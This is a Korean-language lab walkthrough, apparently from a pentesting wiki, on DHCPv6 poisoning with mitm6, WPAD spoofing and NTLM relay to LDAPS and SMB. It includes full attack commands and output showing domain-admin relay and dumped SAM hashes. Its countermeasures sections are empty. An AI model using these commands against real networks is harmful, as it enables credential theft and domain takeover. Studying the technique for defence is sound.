# DHCPv6 포이즈닝

### 설명&#x20;

DHCPv6 포이즈닝 공격은 네트워크에 공격자의 DHCP 서버를 실행해 브로드캐스트 범위 안 호스트들에게 공격자가 원하는 DHCPv6 설정을 전달하는 공격이다.&#x20;

윈도우의 Name Resolution ("이름 풀이")는 다음과 같은 순서로 진행된다.&#x20;

1. IPv6 DNS&#x20;
2. IPv4 DNS&#x20;
3. 레거시 Name Resolution 프로토콜 - LLMNR, NBT-NS, mDNS, 등

또한, DHCP는 다음과 같은 설정을 호스트에게 전달한다:&#x20;

1. 게이트웨이 주소  - ex. 10.1.1.1&#x20;
2. 서브넷 마스크 - ex. 255.255.255.0
3. DNS 서버 주소 - ex. 10.1.1.10
4. Vendor Class Identification&#x20;

대부분 기관들의 내부망 인프라에는 IPv6 DNS 설정까지 담당하는 DHCP 서버들이 많이 없다. 또한, 그런 서버들이 존재한다고는 해도 DHCPv6 관련 보안 설정이 제대로 되어 있지 않은 경우가 있다.&#x20;

따라서 공격자가 성공적으로 DHCPv6 설정을 타겟 호스트에게 전달할 있다면 타겟 호스트의 IPv6 DNS 서버 주소를 바꿀 수 있게 된다. 타겟의 모든 Name Resolution 요청은 공격자에게 전달 될 것이다.&#x20;

### WPAD&#x20;

Windows Proxy Auto Discovery 는 윈도우 호스트의 네트워크 프록시를 설정하는 기능이다. 예를 들어 회사에서 인터넷을 사용할 때 회사의 포워드 프록시 (Forward Proxy) 를 통해야 할텐데, 이를 각각의 호스트에 설정하기 위해서 WPAD 기능이 사용된다. 이는 다음과 같은 형식으로 이뤄진다 (MS16-077 이후 DNS 서버만 사용)&#x20;

1. (클라 -> DNS서버)  WPAD 기능을 사용할 호스트는 DNS 서버에 연락해 `wpad.choi.local` 호스트를 찾는다&#x20;
2. (DNS서버 ->  클라) DNS 서버는 `wpad.choi.local` 의 위치와 WPAD 파일을 찾을 URL을 반환한다 - `wpad.choi.local/wpad.dat`&#x20;
3. 클라이언트는 WPAD 파일을 받아와 호스트 내 설정을 한 뒤, 네트워크 프록시를 사용할 때 WPAD 설정 파일에 적혀져있는 프록시 서버 주소로 프록시 계정 정보 - 대부분 도메인 유저 + 비밀번호 - 를 Net-NTLMv1/v2 형식으로 전달한다

### 악용&#x20;

다음은  DHCPv6 포이즈닝 공격과 WPAD 설정을 합쳐 악용하는 방법이다.&#x20;

1. 타겟 호스트가 Name Resolution을 위해 DHCPv6 Solicit 메시지를 보내며 IPv6 DNS 서버를 찾는다&#x20;
2. 위 메시지에 공격자가 응답하며 DHCPv6 포이즈닝을 실시한다
3. DHCPv6 포이즈닝으로 인해 타겟 호스트의 IPv6 DNS 서버를 공격자 서버 주소로 바꾼다&#x20;
4. 타겟 호스트가 WPAD 서버 `wpad.choi.local` 를 찾기 시작한다. 이때, 윈도우 Name Resolution 순서로 인해 IPv6 DNS 서버를 가장 먼저 이용한다. 이는 #3번으로 인해 공격자 주소로 변환되어 있기 때문에, 공격자 서버에게 가 WPAD 서버의 주소를 물어본다&#x20;
5. 공격자 서버는 공격자 서버 주소로 설정되어 있는 `wpad.dat` 파일을 반환한다&#x20;
6. 타겟 호스트는 공격자 서버로부터 `wpad.dat` 파일을 받아온 뒤, WPAD 설정을 한다&#x20;
7. 앞으로 타겟의 모든 네트워크 프록시 요청들은 공격자 서버 주소를 사용하게 되며, 공격자에게 프록시 계정 정보가 담긴 Net-NTLMv1/v2 트래픽을 보낸다&#x20;

위 과정을 거쳐 타겟 호스트의 프록시 계정 정보가 담긴 Net-NTLMv1/v2 트래픽을 공격자가 받는다면, 이를 해시 크래킹 하거나 NTLM 릴레이 공격에 사용할 수 있다.&#x20;

### 실습 - DHCPv6 포이즈닝&#x20;

1. 먼저 타겟의 DHCPv6 메시지에 응답할 가짜 DHCPv6 서버를 `mitm6` 툴을 이용해 실행한다&#x20;

```
└─# mitm6 -d choi.local                        
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:52:ad:98]
IPv4 address: 192.168.40.132
IPv6 address: fe80::9657:ab93:4d68:306f
DNS local search domain: choi.local
DNS allowlist: choi.local
```

* 공격자 IPv4 주소: 192.168.40.132
* 공격자 IPv6 주소: fe80::9657:ab93:4d68:306f

2. 조금 기다리다 보면 타겟 호스트가 Name Resolution 을 한다. 구글 방문, 회사 이메일 체크, 회사 내부망 파일서버 접속 등. 이때, IPv6 Name Resolution 이 가장 먼저 발생하게 되고, 이때 공격자 서버의 DHCPv6 포이즈닝 공격이 시작된다.&#x20;

```
IPv6 address fe80::192:168:40:151 is now assigned to mac=00:0c:29:e0:7a:44 host=wkstn01.choi.local. ipv4=192.168.40.151
Sent spoofed reply for wpad.choi.local. to fe80::789f:a0cd:a227:2c0
```

* 타겟 IPv4 주소: 192.168.40.151 (wkstn01.choi.local)&#x20;
* 할당된 타겟 IPv6 주소: fe80::789f:a0cd:a227:2c0

<figure><img src="../.gitbook/assets/mitm6-solicit.png" alt=""><figcaption></figcaption></figure>

가장 먼저 공격자의 가짜 DHCPv6 서버 `fe80::9657:ab93:4d68:306f` 가 ICMPv6를 이용해 Router Advertisement 를 하고 있다.&#x20;

그 뒤, 타겟 `fe80::789f:a0cd:a227:2c0` 은 IPv6 Name Resolution을 하기 위해 DHCPv6 Solicit 트래픽을 브로드캐스트 레인지 `ff02` 에 뿌리고, 이에 공격자의 DHCPv6 서버가 Advertise 트래픽을 타겟에게 반환한다. 이후, DHCPv6 Solicit, Advertise, Request, Reply 과정을 통해 DHCPv6 포이즈닝 공격이 성공적으로 이뤄진다.&#x20;

3. 성공적인 DHCPv6 포이즈닝이 이뤄진 후 타겟의 IPv6 설정은 다음과 같다&#x20;

```
ps> ipconfig /all 

Link-local IPv6 Address . . . . . : fe80::789f:a0cd:a227:2c0%5(Preferred)
IPv4 Address. . . . . . . . . . . : 192.168.40.151(Preferred)
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.40.2
DHCPv6 IAID . . . . . . . . . . . : 100666409
DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-28-E1-9A-5D-00-0C-29-E0-7A-44
DNS Servers . . . . . . . . . . . : fe80::9657:ab93:4d68:306f%5
                                   192.168.40.150
                                   1.1.1.1
NetBIOS over Tcpip. . . . . . . . : Enabled
```

DNS 서버의 최상단에 공격자의 서버 주소인 `fe80::9657:ab93:4d68:306f%5` 가 자리잡고 있다. 이제부터 타겟의 DNS Name Resolution은 IPv6 로 일어나고, 가장 먼저 공격자의 IPv6 DNS 서버로 가 Name Resolution을 실행한다.&#x20;

### DHCPv6 포이즈닝 + NTLM 릴레이 - LDAP/S

DHCPv6 포이즈닝 + WPAD 스푸핑 + NTLM LDAP/S 릴레이는 WPAD 때문에 아주 특이한 점이 있다. 타겟 호스트가 WPAD 를 요청할때는 HTTP 트래픽을 사용하는데, 이때 HTTP 트래픽은 Signing 여부와 상관없이 LDAPS 에 릴레이 하면 성공적으로 공격할 수 있다.&#x20;

| NTLM 종류 | LDAP/S | Signing 여부  | 성공 여부 |
| ------- | ------ | ----------- | ----- |
| NTLMv1  | LDAP   | Required    | 실패    |
| NTLMv1  | LDAP   | Off         | 성공    |
| NTLMv1  | LDAPS  | Required    | 성공    |
| NTLMv1  | LDAPS  | Off         | 성공    |
| NTLMv2  | LDAP   | Required    | 실패    |
| NTLMv2  | LDAP   | Off         | 성공    |
| NTLMv2  | LDAPS  | Required    | 성공    |
| NTLMv2  | LDAPS  | Off         | 성공    |

다음 실습은 NTLMv2 + LDAPS + Signing Required 일 때를 가정한 실습이다.&#x20;

1. 타겟이 WPAD 호스트와 설정 파일 위치를 공격자 IPv6 DNS 서버에게 요청한다. 공격자는 서버 위치와 URL을 반환한다.&#x20;

```
// DHCPv6 포이즈닝과 WPAD 서버 위치 스푸핑 

└─# mitm6 -d choi.local                        
[ ... ] 
IPv6 address fe80::192:168:40:151 is now assigned to mac=00:0c:29:e0:7a:44 host=wkstn01.choi.local. ipv4=192.168.40.151
Sent spoofed reply for wpad.choi.local. to fe80::789f:a0cd:a227:2c0
```

2. 타겟 호스트는 WPAD 파일을 가지러 공격자 서버에게 NTLM 인증 트래픽을 HTTP를 통해 보낸다. Signing Required 이기 때문에 LDAPS 서비스로 릴레이한다.&#x20;

```
└─# ntlmrelayx.py -6 -wh xfr.choi.local -t ldaps://192.168.40.150 -socks -debug -smb2support

[*] HTTPD(80): Client requested path: /wpad.dat           
[*] HTTPD(80): Serving PAC file to client ::ffff:192.168.40.151
[*] HTTPD(80): Connection from ::ffff:192.168.40.151 controlled, attacking target ldaps://192.168.40.150            
[*] HTTPD(80): Authenticating against ldaps://192.168.40.150 as CHOI/DA SUCCEED                                     
[*] Enumerating relayed user's privileges. This may take a while on large domains
[ ... ] 
```

타겟이 `/wpad.dat` 파일을 공격자 서버에게 요청하고, 공격자는 프록시 서버 주소에 공격자 서버 주소가 들어간 WPAD 파일을 반환한다. 이 WPAD 파일을 가지고 설정을 마친 타겟 호스트는 프록시를 사용할 때마다 공격자 서버로 프록시 계정 정보가 담긴 Net-NTLMv1/v2 계정 정보를 전송한다.&#x20;

위 실습에서는 프록시 계정 정보에 도메인 어드민 정보가 담겨 있었다. 그리고 이를 도메인 컨트롤러의 LDAPS 서비스에 릴레이를 했다.&#x20;

`ldaps://192.168.40.150 as CHOI/DA SUCCEED` 메시지에서 보이듯,  da@choi.local 유저로 성공적으로 도메인 컨트롤러의 LDAPS 서비스에 인증을 했고, 이를 이용해 액티브 디렉토리 LDAP 데이터를 모두 빼내올 수 있었다.&#x20;



### DHCPv6 포이즈닝 + NTLM 릴레이 - SMB&#x20;

이번에는 SMB로 릴레이를 해본다. SMB의 경우 SMB Signing 여부에 따라 공격이 성공할 수도 있고 실패할 수도 있다. 또한, 타겟 호스트에서 어떤 유저가 프록시를 이용하는가도 중요하다.&#x20;

1. 먼저 DHCPv6 서버를 실행한다&#x20;

```
mitm6 -d choi.local -hw wkstn01.choi.local
```

2. 이후 SMB Signing 이 없는 서버로 릴레이 공격을 실행한다.&#x20;

```
ntlmrelayx.py -6 -wh xfr.choi.local -t smb://192.168.40.150 -smb2support 

[*] HTTPD(80): Authenticating against smb://192.168.40.150 as CHOI/DA SUCCEED
[*] Target system bootKey: 0x37b7fe1178c20af620c25feb531fbe0d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

### 대응 방안&#x20;



### MISC&#x20;

* 타겟 호스트의 WPAD 요청을 이끌어내기 위해서는 다양한 인터넷 브라우저를 켜고, 다양한 사이트에 방문하는 것이 가장 효과적이다.&#x20;
* 아무리 노력해도 타겟이WPAD 요청을  보내지 않는다면, 리부팅을 하는 것이 가장 효과적이다&#x20;



### 대응 방안&#x20;



```
[*] HTTPD(80): Connection from ::ffff:192.168.40.151 controlled, attacking target smb://192.168.40.150
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[-] Authenticating against smb://192.168.40.150 as CHOI/DA FAILED
```



### 레퍼런스&#x20;

{% embed url="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" %}
